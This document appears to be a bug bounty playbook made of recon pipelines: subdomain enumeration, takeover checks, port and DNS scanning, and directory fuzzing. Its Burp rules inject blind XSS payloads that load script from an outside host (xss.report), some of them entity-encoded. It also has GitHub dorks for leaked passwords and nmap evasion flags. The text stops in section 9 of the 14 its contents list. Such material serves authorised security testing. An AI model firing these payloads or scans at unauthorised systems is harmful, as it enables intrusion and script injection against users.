# Ultimate Bug Bounty & Reconnaissance Playbook

A structured, complete reconnaissance and offensive testing methodology with full automation pipelines, custom tooling, and verification one-liners.

---

## Table of Contents

1. [Initial Recon & OSINT](#1-initial-recon--osint)
2. [Burp Suite Configuration & Extensions](#2-burp-suite-configuration--extensions)
3. [Subdomain Enumeration & Permutations](#3-subdomain-enumeration--permutations)
4. [Subdomain Takeover](#4-subdomain-takeover)
5. [Alive Probing & HTTP Status Partitioning](#5-alive-probing--http-status-partitioning)
6. [Host & Wildcard Resolution](#6-host--wildcard-resolution)
7. [Port Scanning & Infrastructure Probing](#7-port-scanning--infrastructure-probing)
8. [DNS Enumeration & IP Probing Pipeline](#8-dns-enumeration--ip-probing-pipeline)
9. [Files & Directory Fuzzing](#9-files--directory-fuzzing)
10. [Comprehensive URL Gathering & Web Crawling](#10-comprehensive-url-gathering--web-crawling)
11. [JS Extraction, Endpoints & Parameter Mining](#11-js-extraction-endpoints--parameter-mining)
12. [Vulnerability Testing & Scanning](#12-vulnerability-testing--scanning)
    - [Prototype & Parameter Pollution](#prototype--parameter-pollution)
    - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
    - [SQL Injection (SQLi)](#sql-injection-sqli)
    - [Open Redirect](#open-redirect)
    - [Local File Inclusion (LFI) & Traversal](#local-file-inclusion-lfi--traversal)
    - [Nuclei Scanning Workflows](#nuclei-scanning-workflows)
    - [Known CVE Quick Probes](#known-cve-quick-probes)
    - [Swagger & API Extraction](#swagger--api-extraction)
    - [Virtual Host (VHost) Fuzzing](#virtual-host-vhost-fuzzing)
    - [CIDR & Network Range Enumeration](#cidr--network-range-enumeration)
    - [CORS Misconfiguration Testing](#cors-misconfiguration-testing)
    - [AWS S3 Buckets & Cloud Enumeration](#aws-s3-buckets--cloud-enumeration)
    - [JavaScript Secret & Exposure Analysis](#javascript-secret--exposure-analysis)
    - [PHP Endpoint Fuzzing & Exploitation](#php-endpoint-fuzzing--exploitation)
    - [HTTP Request Smuggling](#http-request-smuggling)
    - [Origin IP Discovery & Cloudflare Bypass](#origin-ip-discovery--cloudflare-bypass)
    - [EXIF Metadata & Document Dorking](#exif-metadata--document-dorking)
    - [Firebase Misconfiguration](#firebase-misconfiguration)
    - [Miscellaneous Protocol Probing](#miscellaneous-protocol-probing)
13. [Filename Injection Vectors](#13-filename-injection-vectors)
14. [Manual Testing Tips & Business Logic Bypass Matrix](#14-manual-testing-tips--business-logic-bypass-matrix)

---

## 1. Initial Recon & OSINT

```bash
# Company intelligence & asset mapping
# https://www.crunchbase.com/
# https://aleph.occrp.org/
# https://grep.app/

# Amass ASN & CIDR intelligence
amass intel -org "Tesla"
amass intel -active -asn 39416
amass intel -active -cidr 159.69.129.82/32

# WHOIS lookup for registrant email
whois slack.com

# Historical WHOIS & reverse registrant searches
# https://www.arin.net/reference/research/whowas/
# https://www.whoxy.com/ (search by registrant email to discover associated domains)

# Email discovery
# Hunter.io -> Search domain (e.g. admin@target.com)
# AnyMailFinder -> https://anymailfinder.com/

# Hurricane Electric BGP toolkit
# https://bgp.he.net/ -> Search ASNs -> Check Prefix v4 to gather IP ranges

# GitHub dorks & search queries
gitdorks domain.com
# Search for target credentials on GitHub:
# https://github.com/search?q=%22nasa.gov%22+password&type=code
# https://github.com/search?q=%22%22+password&type=code

# Technology profiling
webanalyze -host https://www.google.com -crawl 2

# Cloud provider IP range matching
cat ip-ranges | grep -oP '[a-z0-9]+\.[a-z]+\.[a-z]+' | grep yourtarget | sort -u
cat domains | xargs -I {} grep -oP "[a-z0-9]+\.[a-z]+\.[a-z]+" ~/ip-ranges | grep -F "{}" | sort -u
```

---

## 2. Burp Suite Configuration & Extensions

### Recommended BApp Store Extensions

| Plugin | Description |
| :--- | :--- |
| **HTTP Request Smuggler** | Detects HTTP desync / request smuggling vulnerabilities by probing front-end/back-end request discrepancies. |
| **Param Miner** | Discovers hidden parameters in headers, cookies, and bodies using wordlists and guessing techniques. |
| **Autorize** | Automatically tests authorization by replaying requests with low-privileged or unauthenticated sessions. |
| **AutoRepeater** | Resends requests automatically with custom rules and highlights response diffs for vuln detection. |
| **Active Scan++** | Extends active scanner with Host header injection, cache poisoning, and advanced checks. |
| **Auth Analyzer** | Authorization tester with dynamic token extraction/replacement (CSRF/session tokens). |
| **Logger++** | Advanced HTTP logging with customizable filtering, searching, tagging, and persistence. |
| **J2EEScan** | Focuses on Java/J2EE misconfigurations and enterprise Java vulnerabilities. |
| **inQL** | GraphQL scanner mapping schemas, generating queries, and identifying GraphQL flaws. |
| **Turbo Intruder** | High-performance HTTP fuzzer designed for race conditions, large-scale brute force, and desync tests. |
| **Agartha** | Payload generator, fuzzing utility, and encoding/decoding helpers for manual web testing. |
| **Additional Scanner Checks** | Adds extra passive and active scanning rules for edge cases. |
| **JWT Editor** | Decodes, modifies, signs, and attacks JSON Web Tokens (weak keys, alg none). |
| **JS Link Finder** | Extracts endpoints and hidden links from JavaScript responses. |
| **Upload Scanner** | Deep vulnerability scanning on file upload functionality. |
| **nginx alias traversal** | Tests for Nginx alias directory traversal misconfigurations. |
| **403 Bypasser** | Automates header and path fuzzing for 403 Forbidden pages. |

### Burp Suite Proxy & Rules Configuration

- **Proxy**: Enable response modification rules.
- **Scope**: Configure request and response rules to **In-Scope Only**.
- **HTTP History**: Filter by **In-Scope Only** and requests with parameters.
- **Workflow Triggers**:
  - File upload page: send upload request to **Upload Scanner**.
  - Nginx web server: run **nginx alias traversal**.
  - PHP endpoints with parameters: run **Param Miner**.
  - 403 Forbidden responses: run **403 Bypasser**.

### Match and Replace Rules (Automated XSS Header & Body Injection)

```text
# User-Agent Header Match & Replace:
Match: ^User-Agent.*$
Replace: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0 '"><script src=https://xss.report/c/YOUR-USERNAME></script>

# Referer Header Match & Replace:
Match: ^Referer.*$
Replace: Referer: '"><script src=https://xss.report/c/YOUR-USERNAME></script>

# Request Body Rules:
Match: xss1
Replace: '"><script src=https://xss.report/c/YOUR-USERNAME></script>

Match: xss2
Replace: %22%3E%3Cscript%20src=https://xss.report/c/YOUR-USERNAME%3E%3C/script%3E

Match: xss3
Replace: JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<! →</Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=14564/.source))}//\76 →

Match: xss2
Replace: javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/YOUR-USERNAME\';document.body.appendChild(a)')

Match: xss3
Replace: var a=document.createElement("script");a.src="https://xss.report/c/YOUR-USERNAME";document.body.appendChild(a);

Match: xss4
Replace: &quot;&gt;&lt;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#100;&#111;&#99;&equals;&quot;&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;&#118;&#97;&#114;&#32;&#97;&equals;&#112;&#97;&#114;&#101;&#110;&#116;&period;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&lpar;&quot;&#115;&#99;&#114;&#105;&#112;&#116;&quot;&rpar;&semi;&#97;&period;&#115;&#114;&#99;&equals;&quot;&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#120;&#115;&#115;&period;&#114;&#101;&#112;&#111;&#114;&#116;&sol;&#99;&sol;&#89;&#79;&#85;&#82;&#45;&#85;&#83;&#69;&#82;&#78;&#65;&#77;&#69;&quot;&semi;&#112;&#97;&#114;&#101;&#110;&#116;&period;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#98;&#111;&#100;&#121;&period;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&lpar;&#97;&rpar;&semi;&lt;&sol;&#115;&#99;&#114;&#105;&#112;&#116;&gt;&quot;&gt;
```

---

## 3. Subdomain Enumeration & Permutations

```bash
# 1. Passive & Active Collection
export PDCP_API_KEY=YOUR-CHAOS-API-KEY && chaos -dL wildcards | tee -a subs-chaos
otherSUBS -l wildcards -o subs-others
cat wildcards | xargs -I{} -P 10 sh -c 'shuffledns -d {} -w ~/wordlists/dns.txt -r ~/wordlists/resolvers.txt -mode bruteforce' | tee -a subs-shuffledns
subfinder -dL wildcards -o subs-subfinder -all -recursive
shrewdeye wildcards -o subs-shrewdeye
cat wildcards | assetfinder --subs-only | tee -a subs-assetfinder
findomain -f wildcards | tee -a subs-findomain
sublist3r_domains wildcards -o subs-sublist3r

# 2. DNS Brute Forcing with Gobuster & FFUF
cat wildcards | xargs -P 5 -I{} sh -c 'gobuster dns --domain "{}" -w ~/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --wildcard -o temp_{}.txt && awk "{print \$2}" temp_{}.txt | grep -v "^$" >> subs-gobuster && rm temp_{}.txt'
cat wildcards | xargs -P 5 -I{} sh -c 'ffuf -u "FUZZ.{}" -w ~/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200,201,301,302,403,404,500,502 | tee -a subs-ffuf'

# 3. Aggregation, Deduplication & Scope Filtering
mkdir -p done && cat subs-* >> subs && cat subs | anew >> subdomains && mv subs subs-* done/
awk 'NR==FNR{domains[$1]; next} {matched=0; for(d in domains) if($0==d || $0 ~ ("\\."d"$")) {matched=1; break} if(matched) print > "subs_allowed.txt"; else print > "subs_rejected.txt"}' wildcards subdomains && mv subdomains subs_rejected.txt done/ && mv subs_allowed.txt subdomains && rm -f temp_*
```

---

## 4. Subdomain Takeover

```bash
# Extract CNAMEs and probe
cat subs.txt | xargs -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/\.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe

# Subzy automated vulnerability checks
subzy run --targets subdomains --vuln --hide_fails --concurrency 100 --verify_ssl --output subzy | grep -Ev "Cargo Collective|DISCUSSION|DOCUMENTATION"
cat subzy | grep -oP '"subdomain":\s*"([^"]+)"|"engine":\s*"([^"]+)"' | awk 'NR%2{printf "%s ", $0; next} {print $0}' | tee subzy-check && sed -i '/Unbounce\|Cargo Collective\|Uptimerobot\|Akamai/d' subzy-check

# Subjack & SubOver verification
subjack -w subdomains -t 100 -v -ssl -c /root/go/pkg/mod/github.com/haccer/subjack@v0.0.0-20201112041112-49c51e57deab/fingerprints.json -o subjack
SubOver -l subdomains.txt -t 100 -a -v -https -o subover

# Visual screenshot verification
# aquatone is used to verify targets with visual page rendering

# Manual CNAME verification
# dig example.example.com CNAME -> take CNAME and check if service/bucket is claimable
```

---

## 5. Alive Probing & HTTP Status Partitioning

```bash
sed -i '/^-/d' subdomains
cat subdomains | httpx | tee -a httpx
awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto
cat subdomains | httpx -sc -cl -td -fr -title -vhost -ip -web-server -o httpx-info
cat subdomains | httpx -mc 200,201 -o httpx2xx
cat subdomains | httpx -mc 401,403,404 -o httpx4xx
cat subdomains | httpx -mc 301,302 -o httpx3xx
cat subdomains | httpx -mc 502,503,500 -o httpx5xx
cat domains | httprobe -c 50 -t 20000 | tee -a domains-proto

# Extract endpoints, parameters, and JS files from live 200 hosts
node ~/dom.js httpx2xx
```

---

## 6. Host & Wildcard Resolution

```bash
# 1. Resolve host IP mappings for base domains
for i in $(cat domains); do dig +noall +answer "$i" | awk '{print $1}' | sed 's/\.$//'; done | anew | tee -a hosts2 && cat hosts2 | grep -Fxv -f domains | tee -a hosts-domains
cat hosts-domains | httpx | tee -a hosts-domains-alive
cat hosts-domains | httpx -sc -cl -title -ip -vhost -td | tee -a hosts-domains-alive-info
cat hosts-domains | httpx -mc 200 | tee -a hosts-domains-alive200

# 2. Resolve hosts for wildcards & filter out clean base domains
for i in $(cat httpx-noproto); do dig +noall +answer "$i" | awk '{print $1}' | sed 's/\.$//'; done | anew | tee -a hosts1 && awk -F. '{n=NF; if(n>1) print $(n-1)"."$n}' wildcards | sort -u > wildcards-clean && cat hosts1 | grep -Fxv -f httpx-noproto | awk 'NR==FNR{w[$0]=1; next} {for(x in w) if($0==x || $0 ~ ("\\."x"$")) next}1' wildcards-clean - | tee -a hosts-httpx && mv wildcards-clean done/
cat hosts-httpx | httpx | tee -a hosts-alive
cat hosts-httpx | httpx -sc -cl -title -ip -vhost -td | tee -a hosts-alive-info
cat hosts-httpx | httpx -mc 200 | tee -a hosts-alive200

# 3. Scan resolved live hosts with Nuclei
nuclei -l hosts-alive -tags swagger -rl 50 | tee -a nuclei-hosts-swagger
nuclei -l hosts-alive -o nuclei-hosts-httpx -s low,medium,high,critical -rl 50

# 4. FFUF Endpoint Discovery & Formatting
cat hosts-alive | while read -r url; do echo "Results for $url" | tee -a ffuf-hosts0; ffuf -u "https://$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -timeout 5 -ac -recursion | uniffuf | tee -a ffuf-hosts0; echo "--------------------------------------" | tee -a ffuf-hosts0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf-hosts0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf-hosts
```

---

## 7. Port Scanning & Infrastructure Probing

```bash
# Naabu top ports scan on stripped hosts
cat httpx-noproto | naabu -p 21,22,23,25,53,67,68,69,80,110,123,135,137,139,143,161,162,179,389,443,445,465,500,587,873,993,995,1194,1433,1812,1813,2049,3000,3128,3306,3389,4500,5000,5060,5061,5432,5672,5900,5985,5986,6379,8000,8008,8080,8081,8443,8888,9000,9080,9200,9300,10000,11211,27017 -o naabu
cat naabu | httpx -sc -td -title -cl -fr -vhost -ip -web-server | tee -a naabu-httpx

# Full port scan
awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto
naabu -l httpx-noproto -p 1-65535 -o naabu

# Nmap scanning commands
nmap -iL httpx-noproto -p- -oN nmap.txt
nmap target -Pn -sV -sC
nmap -p <openport> -sV url/ip
nmap example.com -p21 --script=ftp*

# Firewall bypass & stealth options:
# -Pn: Bypass ping probe
# -f: Fragment packets
# -sS: SYN stealth scan
# -D 10.10.10.10: Decoy IP
# --script=<scriptname> (e.g. ssh*, vuln, dos, exploit, brute)
```

---

## 8. DNS Enumeration & IP Probing Pipeline

```bash
# 1. DNSX & IP Extraction
cat httpx | dnsx -recon | tee -a dnsx && sed -r 's/\x1B\[[0-9;]*m//g' dnsx > cleaned_dnsx && grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' cleaned_dnsx | tee -a dnsx-ips
grep -v '^[[:space:]]*-' httpx-noproto | sed '/^[[:space:]]*$/d' | while read -r domain || [ -n "$domain" ]; do dig +short A "$domain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'; done > ips.txt
cat dnsx-ips >> ips.txt && cat ips.txt | anew >> ips && rm ips.txt dnsx-ips && mv ips ips.txt && cat ips.txt | cdnstrip -c 50 | tee -a ips && rm ips.txt

# 2. Port Scan on Cleaned A-Record IPs
cat ips | naabu -p 21,22,23,25,53,67,68,69,80,110,123,135,137,139,143,161,162,179,389,443,445,465,500,587,873,993,995,1194,1433,1812,1813,2049,3000,3128,3306,3389,4500,5000,5060,5061,5432,5672,5900,5985,5986,6379,8000,8008,8080,8081,8443,8888,9000,9080,9200,9300,10000,11211,27017 -o naabu-ips
cat naabu-ips | httpx -sc -td -title -cl -fr -vhost -ip -web-server | tee -a naabu-ips-httpx

# 3. HTTP Status Categorization on IPs
cat ips | httpx | tee -a httpx-ips
awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto-ips
cat ips | httpx -sc -cl -td -fr -title -vhost -web-server -o httpx-info-ips
cat ips | httpx -mc 200,201 -o httpx2xx-ips
cat ips | httpx -mc 401,403,404 -o httpx4xx-ips
cat ips | httpx -mc 301,302 -o httpx3xx-ips
cat ips | httpx -mc 502,503,500 -o httpx5xx-ips

# 4. FFUF Content Discovery on IPs
cat httpx-ips | while read -r url; do echo "Results for $url" | tee -a ffuf0ips; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -timeout 5 -ac -recursion | uniffuf | tee -a ffuf0ips; echo "--------------------------------------" | tee -a ffuf0ips; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf0ips | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffufips

# 5. Extract endpoints, parameters, and JS files from live 200 IPs
node ~/dom.js httpx2xx-ips

# 6. Archive URL Collection for IPs
while IFS= read -r domain; do curl -sG "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=${domain}/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" | uro | anew | tee -a urls-wayback-ips; done < httpx-noproto-ips
katana -list httpx-ips -o urls-katana-ips -jc -dr -em 7z,7zip,accdb,backup,bak,cache,class,cfg,conf,config,css,crt,csv,csr,db,db3,dbf,doc,docx,ear,js,env,gitignore,dmg,gz,ini,jar,java,json,key,log,md,md5,mdb,pdf,pem,pl,plist,pptx,p12,rpm,py,properties,rar,exe,secret,dll,sh,sql,sqlcipher,sqlitedb,sqlite3,action,adr,ascx,asmx,axd,bkf,iso,bkp,asc,pub,msi,bok,achee,cfm,cnf,lst,mai,mbox,mbx,nsf,ora,pac,passwd,pcf,pgp,rdp,reg,rtf,skr,tpl,url,deb,wml,bat,xsd,tar,bin,tar.gz,tgz,txt,war,xls,xlsx,xml,xz,yaml,yml,swp,tmp,htm,img,zip,lock,aspx,asp,html,inc,php,old,jsp,cgi,jku,jwk,jks,jwt
cat httpx-ips | hakrawler | tee -a urls-hakrawler-ips
cat httpx-ips | gau --blacklist ico,svg,woff,ttf,html,list,css,png,jpg,gif --mc 200 >> urls-gau-ips
waymore -n -i httpx-noproto-ips -oU urls-waymore-dnsx -mode U
cat urls-*-ips >> allurls-ips && cat allurls-ips | anew | uro -o urls-ips && rm allurls-ips urls-*-ips

# 7. Shortscan for IIS on IP hosts
cat httpx-info-ips | grep IIS | tee -a IIS-dnsx && sed -i 's/ .*//' IIS-ips && for url in $(cat IIS-ips); do shortscan -F $url | tee -a IIS-scanned-ips; done

# 8. Clean Foreign / Out-of-Scope URLs
awk -F/ 'NR==FNR{domains[$1]; next} {host=$3; sub(/:.*/,"",host); matched=0; for(d in domains) if(host==d || host ~ ("\\."d"$")) {matched=1; break} if(matched) print > "urls_allowed-ips.txt"; else print > "urls_rejected-ips.txt"}' ips urls-ips && mv urls-ips done/ && mv urls_allowed-ips.txt urls-ips

# 9. Extract High-Value URL Patterns
cat urls-ips | grep "=eyJ" | sort -u >> eyJ-ips
cat urls-ips | grep -iE 'admin|internal|dashboard' > admin-ips
cat urls-ips | grep -E -o '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' urls | sort -u > emails-ips

# 10. Extension Partitioning and JS Extraction on IPs
mkdir -p extensions-ips && cd extensions-ips && cat ../urls-ips | grep -Eo 'https?://[^ ]+\.(7z|7zip|accdb|backup|bak|cache|class|cfg|conf|config|css|crt|csv|csr|db|db3|dbf|doc|docx|ear|js|env|gitignore|dmg|gz|ini|jar|shtm|shtml|java|json|key|log|md|md5|mdb|pdf|pem|pl|plist|pptx|p12|rpm|py|properties|rar|exe|secret|dll|sh|sql|sqlcipher|sqlitedb|sqlite3|action|adr|map|ashx|ascx|asmx|axd|bkf|iso|bkp|asc|pub|msi|bok|achee|cfm|cnf|lst|mai|mbox|mbx|nsf|ora|pac|passwd|pcf|pgp|rdp|reg|rtf|skr|tpl|url|deb|wml|bat|xsd|tar|bin|tar\.gz|tgz|txt|war|xls|xlsx|xml|xz|yaml|yml|swp|tmp|htm|img|zip|lock|aspx|asp|html|inc|php|old|jsp|cgi|jku|jwk|jks|jwt|js\.map)(\?|$)' | while read -r url; do ext="${url##*.}"; ext="${ext%%\?*}"; echo "$url" >> "$ext"; done && cat ../jsfiles.txt >> js && cat js | anew >> jss && rm js && mv jss js && cd .. && mv jsfiles.txt done/
cd extensions-ips && for f in *; do [ -f "$f" ] && httpx -l "$f" -o "${f}-alive"; done && cd ..

# Extract endpoints & parameters from alive JS files
total=$(wc -l < extensions-ips/js-alive); i=0; while read -r url; do i=$((i+1)); content=$(curl -s "$url"); echo "$content" | grep -oE '/[a-zA-Z0-9_/\.-]+(\?[a-zA-Z0-9_=&%-]*)?' | sed 's/\?.*$//' | sed -E 's/\.[a-zA-Z0-9]+$//' | anew endpoints.txt >/dev/null; echo "$content" | grep -oE '/[a-zA-Z0-9_/\.-]+\?[a-zA-Z0-9_=&%-]+' | sed 's/.*?//' | tr '&' '\n' | cut -d= -f1 | anew parameters.txt >/dev/null; printf "\r[%d/%d] %d%%" "$i" "$total" "$((i*100/total))"; done < extensions-ips/js-alive; echo

# Extract endpoints from URLs
awk -F/ '{p=""; for(i=4;i<NF;i++){p=p "/" $i} if(length(p)==0 && NF>3) p="/"; else if(length(p)>0 && substr(p,1,1)!="/") p="/" p; if(length(p)>0){gsub(/[:;%$&*()[\]{}]/,"",p); print p}}' urls | sed '/^$/d' | anew >> endpoints.txt

# Extract parameters from URLs
cat urls-ips | grep '?' | sed 's/.*?//' | tr '&' '\n' | cut -d'=' -f1 | anew | tee -a params-ips
cat ~/parameters.txt >> params && cat parameters.txt >> params
cat params | anew >> parameters && mv params done/ && mv parameters.txt done/

# Strip query parameters from URLs
sed 's/[?].*//' urls-ips | tee -a deparameterized-ips

# Clean endpoints
sed -E 's/\/[^\/]+\.[a-zA-Z0-9]+$//' endpoints.txt | sed -E 's/([^\?&#]+)(\?.*|#.*)?/\1/' | sed 's:/$::' | grep -v '^$' | anew >> endpoints && mv endpoints.txt done/

# Merge alive IPs with discovered endpoints
cat httpx-ips | while read -r url; do echo "Results for $url" | tee -a finalendpoints0-ips; ffuf -u "$url/FUZZ" -w endpoints -fs 0 -mc 200 -timeout 5 -ac | uniffuf | tee -a finalendpoints0-ips; echo "--------------------------------------" | tee -a finalendpoints0-ips; done && awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' finalendpoints0-ips | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > finalendpoints-ips

# Filter dynamic script extensions
grep -E '\.(php|asp|aspx|jsp|py|rb|pl|cgi|do|action|ashx)(\?|#|$)' urls-ips | sed -E 's/([^\?&#]+)(\?.*|#.*)?/\1/' | httpx -silent | tee -a extendedUrls-ips
cat extendedUrls-ips httpx-ips finalendpoints-ips >> phase1-ips

# FFUF Parameter Fuzzing on IPs with baseline size filtering
while read url; do echo "=== Testing $url ==="; baseline=$(curl -s -o /dev/null -w "%{size_download}" "${url}?dummyparam=123"); echo "Results for $url" | tee -a phase2-ips; ffuf -u "${url}?FUZZ=1" -w parameters -fs "$baseline" -timeout 5 -ac | uniffuf | tee -a phase2-ips; echo "--------------------------------------" | tee -a phase2-ips; done < phase1-ips

# Clean FFUF output into parameterized URLs
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(length(ep)>0) out=out ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' phase2-ips | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "?" $0 "=1"}}' | anew >> parameterizedUrls-ips

# Source map extraction on IPs
mkdir -p jsmap-ips && cd jsmap-ips && while read -r url; do name=$(basename "$url" .js.map); sourcemapper -output "$name" -url "$url"; done < ../extensions-ips/js.map-alive
while read -r url; do name=$(basename "$url" .js); sourcemapper -output "$name" -jsurl "$url"; done < ../extensions-ips/js-alive; cd ..

# Nuclei scans on IP assets
nuclei -l httpx-ips -tags swagger -rl 50 | tee -a nuclei-swagger-ips
nuclei -l parameterizedUrls-ips -dast -o nuclei-dast-ips -s low,medium,high,critical -rl 50
nuclei -l httpx-ips -o nuclei-httpx-ips -s low,medium,high,critical -rl 50
```

---

## 9. Files & Directory Fuzzing

```bash
# 1. FFUF on all alive hosts
cat httpx | while read -r url; do echo "Results for $url" | tee -a ffuf0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -timeout 5 -ac -recursion | uniffuf | tee -a ffuf0; echo "--------------------------------------" | tee -a ffuf0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf

# 2. FFUF partitioned by HTTP status code
# 2xx Hosts
cat httpx2xx | while read -r url; do echo "Results for $url" | tee -a ffuf2xx0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -ac -recursion | uniffuf | tee -a ffuf2xx0; echo "--------------------------------------" | tee -a ffuf2xx0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf2xx0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf2xx

# 4xx Hosts
cat httpx4xx | while read -r url; do echo "Results for $url" | tee -a ffuf4xx0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -ac -recursion | uniffuf | tee -a ffuf4xx0; echo "--------------------------------------" | tee -a ffuf4xx0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf4xx0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf4xx

# 5xx Hosts
cat httpx5xx | while read -r url; do echo "Results for $url" | tee -a ffuf5xx0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -ac -recursion | uniffuf | tee -a ffuf5xx0; echo "--------------------------------------" | tee -a ffuf5xx0; done
